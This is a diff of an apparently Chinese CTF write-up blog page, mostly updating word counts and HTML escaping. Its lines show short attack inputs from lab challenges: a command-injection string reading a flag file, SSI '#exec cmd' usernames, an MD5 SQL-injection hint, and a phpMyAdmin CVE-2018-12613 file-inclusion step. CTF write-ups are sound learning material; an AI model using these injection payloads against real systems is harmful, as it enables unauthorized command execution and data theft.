@@ -406,14 +406,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2k
+                    1.9k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    9 分
+                    8 分
                 </div>
                 
 
@@ -586,7 +586,7 @@
 <p>127.0.0.1 | cat ../../../flag</p>
 </blockquote>
 <h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p><img src="../../../../medias/img/image-20200912085834738.png" alt="image-20200912085834738"></p>
-<p>响应头提示<code>select * from 'admin' where password=md5($pass,true)</code></p>
+<p>响应头提示<code>select * from &#39;admin&#39; where password=md5($pass,true)</code></p>
 <p><a href="https://www.jianshu.com/p/12125291f50d" target="_blank" rel="noopener">md5注入</a></p>
 <blockquote>
 <p>如果可选的 raw_output 被设置为 TRUE，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回</p>
@@ -726,15 +726,15 @@ i<span class="token operator">=</span><span class="token number">0</span>
 <p><img src="../../../../medias/img/image-20200916181329097.png" alt="image-20200916181329097"></p>
 <p><img src="../../../../medias/img/image-20200916181253933.png" alt="image-20200916181253933"></p>
 <p><a href="https://blog.csdn.net/qq_40657585/article/details/84260844" target="_blank" rel="noopener">ssi注入</a></p>
-<p>将用户名改为<code>&lt;!--#exec cmd="ls ../"--&gt;</code></p>
+<p>将用户名改为<code>&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;</code></p>
 <p><img src="../../../../medias/img/image-20200916181648989.png" alt="image-20200916181648989"></p>
-<p><code>&lt;!--#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2"--&gt;</code></p>
+<p><code>&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;</code></p>
 <p><img src="../../../../medias/img/image-20200916181934904.png" alt="image-20200916181934904"></p>
 <h1 id="real"><a href="#real" class="headerlink" title="real"></a>real</h1><h2 id="PHPMYADMIN-CVE-2018-12613"><a href="#PHPMYADMIN-CVE-2018-12613" class="headerlink" title="[PHPMYADMIN]CVE-2018-12613"></a>[PHPMYADMIN]CVE-2018-12613</h2><p><a href="https://blog.csdn.net/qq_45158261/article/details/107760856" target="_blank" rel="noopener">1</a></p>
 <p><a href="https://blog.csdn.net/qq_33020901/article/details/80829269?https:%252f%252fblog.csdn.net%252fqq_33020901%252farticle%252fdetails%252f80829269" target="_blank" rel="noopener">2</a></p>
 <p>先执行sql语句</p>
 <blockquote>
-<p>select ‘<!--?php phpinfo()?-->‘</p>
+<p>select ‘<?php phpinfo()?>‘</p>
 </blockquote>
 <p>然后查看cookie，进行session包含，查看绝对路径</p>
 <blockquote>
@@ -748,25 +748,7 @@ i<span class="token operator">=</span><span class="token number">0</span>
 <p>发现写不了</p>
 <p>原来flag就在PHP info中</p>
 <p><img src="../../../../medias/img/image-20200812210315524.png" alt="image-20200812210315524"></p>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>
+
             </div>
             <hr/>
 
@@ -1230,7 +1212,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">5.1k</span>&nbsp;字
+                class="white-color">5.2k</span>&nbsp;字
             
             
             
